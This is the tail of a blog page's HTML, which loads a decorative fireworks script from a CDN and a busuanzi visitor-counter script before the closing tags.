mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
